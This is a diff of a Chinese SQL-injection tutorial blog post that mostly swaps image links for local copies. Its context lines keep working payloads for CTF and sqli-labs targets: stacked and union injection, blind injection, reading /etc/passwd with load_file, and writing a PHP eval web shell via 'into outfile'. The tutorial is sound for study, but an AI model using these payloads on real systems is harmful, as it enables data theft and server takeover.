-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png)
+[![image.png](../../../_assets/images/f372d558dd8ffc83336855fd25d69b1a83d6dd7831803c9d2b13db580374284f.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png)
 ** null与任何条件（真、假、null）做异或,结果都为null **
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png)
+[![image.png](../../../_assets/images/ccceb4288dc74acc60bba27ec4db1909a70f973ea562b2e05088b71ebaa12639.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png)
 
 ^和xor是有区别的
 ** ^运算符会做位异或运算 如1^2=3 **
@@ -1576,7 +1576,7 @@ mysql> select 1^1;
 ```
 
 ** xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 **
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png)
+[![image.png](../../../_assets/images/c187ff2bad1fb6bb13a0240838881f560b1a8cfb5db8e40567b337b43bbbd5b5.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png)
 
 # 使用handler进行注入
 
@@ -1614,7 +1614,7 @@ handler tablename read frist;
 handler tablename close;
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png)
+[![image.png](../../../_assets/images/6dc687ae0c926ed3d72306843c468274a43de8b349414eea2fa7fd85c3ec96b8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png)
 **[强网杯 2019]随便注**
 查表:
 经过测试，存在堆叠注入
@@ -1623,7 +1623,7 @@ handler tablename close;
 http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;show%20tables;%23
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png)
+[![image.png](../../../_assets/images/6063ac7fdf01f85f450a944d52afb52ed3873232e215864d026709fd6579241e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png)
 进一步测试，发现select被过滤
 使用desc查一些表:
 
@@ -1631,7 +1631,7 @@ http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;show
 http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;desc%20`1919810931114514`;%23
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png)
+[![image.png](../../../_assets/images/aed76246f340dd59cc8518fdf31bcc9c5f797f10afaeedcdf8c45bd8ce8c8c1c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png)
 后面就使用handler读数据:
 最终payload:
 
@@ -1650,7 +1650,7 @@ http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;hand
 
 - sys.schema_auto_increment_columns
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png)
+[![image.png](../../../_assets/images/d9f1802d6f43d72374321141e6613560c5da9d5404813095a75a6e8c3ef6edec.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png)
 我们可以利用这个表来读取表名:
 
 ```
@@ -1673,7 +1673,7 @@ mysql> select table_name from sys.schema_auto_increment_columns;
 - sys.x$schema_table_statistics_with_buffer
 - …
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png)
+[![image.png](../../../_assets/images/d2f5931bde0cfd139d8d29b4bd09247e52755b311a81805d790fe8095e7adc52.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png)
 
 ```
 mysql> select table_name from sys.schema_table_statistics_with_buffer;
@@ -1742,22 +1742,22 @@ mysql> select table_name from mysql.innodb_index_stats;
 ## 取别名绕过列名查数据
 
 **正常查询**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png)
+[![image.png](../../../_assets/images/aae6bda6e3f1435a5d05d6774e2845226b2c7c4c444cd97c3edb2fd29aa350e8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png)
 **将列名转换为任何可选的已知值**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png)
+[![image.png](../../../_assets/images/697daabc216eb5194043f11d40205ddf429209f1d8ba32f7753e31940d6986b0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png)
 此时我们发现列名变为1,2,3 受我们所控制
 **代替列名读取数据**
 像这样就可以查询第二列的数据，在虚拟表中，列名都是1，2，3，所以我们在查询语句中要用 `2` 而不能直接用 2
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png)
+[![image.png](../../../_assets/images/d4117cd97b151fb938fad313d55347859c01b2775866f78ab8048663817c5b56.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png)
 取别名也可以直接在后面加
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png)
+[![image.png](../../../_assets/images/6ca348d4fc8059f4fb1119a42fc07ef30e662bf8241cd2ffea929e0fde3c1e5a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png)
 **注入payload**
 
 ```
 -1'union select 1,(select group_concat(b) from(select 1 as a,2 as b,3 as c union select * from users)as m),3#
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png)
+[![image.png](../../../_assets/images/d04e7e333a04f3383254e821ab845d653f1aee7c46b3942b4830a99dbdc156d0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png)
 
 ## 利用join爆列名
 
@@ -1888,14 +1888,14 @@ for i in range(1,50):
 http://127.0.0.1/sqli-labs/Less-8/?id=1'and length(database())=1--+
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png)
+[![image.png](../../../_assets/images/f0ecf37d9c8f13f62126cac96df6549c3e697eb6f9159a639191ca52edbb5d49.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png)
 当我们输入这样的语句，界面并没有反应，我们慢慢增加长度，到8时出现变化了:
 
 ```
 http://127.0.0.1/sqli-labs/Less-8/?id=1'and length(database())=8--+
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png)
+[![image.png](../../../_assets/images/6121cf0a0365b075fff74200dc3a1bb77ae9bd3c702089097829c433b694d075.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png)
 这就说明盲注成功了！
 剩下的就是结合一些函数提取出对应的字符进行判断即可
 
@@ -1966,14 +1966,14 @@ for i in range(10000):
 
 首先我们启动第一个payload，看一下结果
 **得到数据库名:**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png)
+[![image.png](../../../_assets/images/9e37000d241343ed9972b9f2a68427721179412837e89a288d0597febdcb2161.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png)
 **启动第二个payload，得到表名:**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png)
+[![image.png](../../../_assets/images/00489409995438f6ba4b939f445a4df35ec72590214c8984db4f58672ab2e2b8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png)
 **启动第三个payload,我们查一下user表的字段**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png)
+[![image.png](../../../_assets/images/eb35c872d17d492c3024832a86480c456d27e1b0910150e25189fabac7443a95.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png)
 **启动最后一个payload，来获取username字段里的数据叭**
 如图，成功得到了字段里的数据
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png)
+[![image.png](../../../_assets/images/5cc7f947730e1e9e1c4cfc03512679c1d3bf439d5b941e3318b2eee1b51393fa.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png)
 通过脚本辅助注入可以极大的提升我们的注入效率！
 
 ## 延迟盲注
@@ -1982,7 +1982,7 @@ for i in range(10000):
 延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显
 还是利用if来判断结果正确与否，只是返回值用延时来代替1
 详情可查看上文，我们可以利用这个来判断是否注入，不过个人觉得并不适合批量跑数据，因为时间有太多的不可控性,我们拿来做个判断就好，同样用sqil-labs8来示范
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png)
+[![image.png](../../../_assets/images/f2bbbb262a477ba89380a1600f225b37c7a2f83fc1493c4bd4faebb296e41a81.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png)
 这个页面过了10s左右才加载完毕，我们可以利用这个来判断是否存在注入
 
 ## 爆错盲注
@@ -2025,7 +2025,7 @@ secure_file_priv没有设置时，则表示没有任何限制
 ```
 
 我们要让secure_file_priv没有任何限制才能注入成功，我们这里本地搭建环境
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png)
+[![image.png](../../../_assets/images/3bf480b1db951529fbda6f0d2a1b8f061a9570a212e0cf2c111fb1b599490be8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png)
 让这里为空
 **相关函数:**
 
@@ -2062,9 +2062,9 @@ load_file()函数访问的是文件，所以域名后面需要添加/abc
 ```
 
 我们来执行一下语句:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png)
+[![image.png](../../../_assets/images/fb4f60e6155029fb2cdda97ced5e324e984057bb4a502b3870313930a8c4ea50.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png)
 如图，这里的security就是我们的数据库名称
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png)
+[![image.png](../../../_assets/images/052897f5d4525b205aeb74339275b941649998a3323c28e1462d2e10fa4ba1ed.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png)
 
 # **mysql关于utf-8编码问题**
 
@@ -2136,7 +2136,7 @@ mysql> select load_file('E:/phpstudy_pro/WWW/flag.txt');
 1 row in set (0.00 sec)
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png)
+[![image.png](../../../_assets/images/370e83322ecde336eec7dabdc9924c97b34711c46a481087369d97697c11de7a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png)
 当我们使用SQL注入来进行文件读写时，还需要注意，在网站的PHP设置中是否使用了magic_quotes_gpc的魔术引导开关，该参数的设置会对单引号、双引号、反斜杠与空字符进行过滤。这样，当我们使用MySQL进行文件读写，要输入目标站点路径时，就会受到限制。针对这一点，**我们可以使用16进制编码的方式来进行绕过。**
 
 ```
@@ -2182,7 +2182,7 @@ load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
 ```
 
 这里我本地复现失败了，我就放一张别人的图吧，qaq
-[![图片-26.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png)
+[![图片-26.png](../../../_assets/images/c91ae0eea26e8ec45f74232ca332773c646204809c788e027683ba9a07c9295a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png)
 
 # sql注入写shell
 
@@ -2202,7 +2202,7 @@ Query OK, 1 row affected (0.00 sec)
 select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into outfile 'E:/phpstudy_pro/WWW/xx.php';
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png)
+[![image.png](../../../_assets/images/4e47ea9594406ae950dacdf5b4266f31ed89143b18a37c661a7f1e9771c33544.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png)
 写入shell成功!
 
 ## into dumpfile()写文件
@@ -2283,7 +2283,7 @@ flush privileges;
 ```
 
 我们来远程连接一下:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png)
+[![image.png](../../../_assets/images/2180bdb2f5e95b5e8de4aeeec8512d38f10cf25977387e4a8fba23f6a84d0846.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png)
 成功连接上去了
 **sql注入的靶场用sqli-lab**
 https://github.com/c0ny1/vulstudy
@@ -2312,7 +2312,7 @@ docker restart e0c30b42806f
 ```
 
 搞了好久，终于搭建好了，md
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png)
+[![image.png](../../../_assets/images/bbe47843a5d4200b8036c51f3354efe1825e5dde6264c2f005dc2e12446568fa.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png)
 
 ## table
 
@@ -2324,8 +2324,8 @@ docker restart e0c30b42806f
 语法：TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png)
+[![image.png](../../../_assets/images/22a13e10087a0bbe3bd4ba5b5ad2c02033d2e479dfa91aa5353ae070e90ab56a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png)
+[![image.png](../../../_assets/images/26e67809a6460b6bc1bea8b13732ce4248b71848ec52ed08e37a19f4686a66af.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png)
 **支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。**
 
 ```
@@ -2333,8 +2333,8 @@ table user order by 2
 table user limit 2
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png)
+[![image.png](../../../_assets/images/582ee1b295020ca2b9c0711e2e03b2e5cdc469d25b94abe42f95cc33e7dd575e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png)
+[![image.png](../../../_assets/images/67b7703bb09dded7081d9b294b85dd6c4b8099b218fa04f2c877d72252a6f23f.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png)
 **与SELECT的区别：**
 
 ```
@@ -2343,7 +2343,7 @@ table user limit 2
 
 **注意事项:**
 **比较问题一:**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png)
+[![image.png](../../../_assets/images/f72cdaaa0fd337d8869f52f25ad045b9f5792783889efaed6608c40e1ccce6bb.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png)
 我们来构造sql语句:
 
 ```
@@ -2471,7 +2471,7 @@ VALUES ROW(1,2,3)
 VALUES ROW(1,2,3),ROW(5,6,7)
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png)
+[![image.png](../../../_assets/images/25b82c4e98e8518f149f9717e098e87c4718bbebd65e124d18892a28cd24739f.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png)
 配合union使用:
 
 ```
@@ -2488,7 +2488,7 @@ table information_schema.TABLESPACES_EXTENSIONS
 select * from information_schema.TABLESPACES_EXTENSIONS
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png)
+[![image.png](../../../_assets/images/f1a7523cef35da31e9b0f105ea5fa3b2148a4334785df231aed2790ff10d5f7a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png)
 类似的还有:
 
 ```
@@ -2555,7 +2555,7 @@ $row = mysql_fetch_array($result);
 </html>
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png)
+[![image.png](../../../_assets/images/be09ae27e22d9ae0ff63e9009ced4e9dd7de7fa8179dab7ce83725b3affda3e0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png)
 我们来用新方法注入:
 首先用order by判断列数，这里不再说明，得出三列
 
@@ -2564,7 +2564,7 @@ $row = mysql_fetch_array($result);
 http://193.43.142.8/Less-1/?id=-1'union values row(1,2,3)--+
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png)
+[![image.png](../../../_assets/images/70f7113c81a72968f8074a9cba7180d6320bea05eb246e13f5ba90e6e9ed4106.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png)
 然后就是常规的需要知道库名，表名，字段名
 当前库可以通过布尔盲注得到
 
@@ -2579,7 +2579,7 @@ table information_schema.schemata       #列出所有数据库名
 ```
 
 因为table不能像select控制列数，除非列数一样的表，不然都回显不出来，也需要使用盲注
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png)
+[![image.png](../../../_assets/images/74cae4c54bd54e324bec775af7ffa8c1a80b0ff06ef7a0bf2b248e3dedbb7ff7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png)
 
 ```
 http://193.43.142.8/Less-1/?id=1'&&('def','m','',4,5,6)<(table information_schema.schemata limit 1);
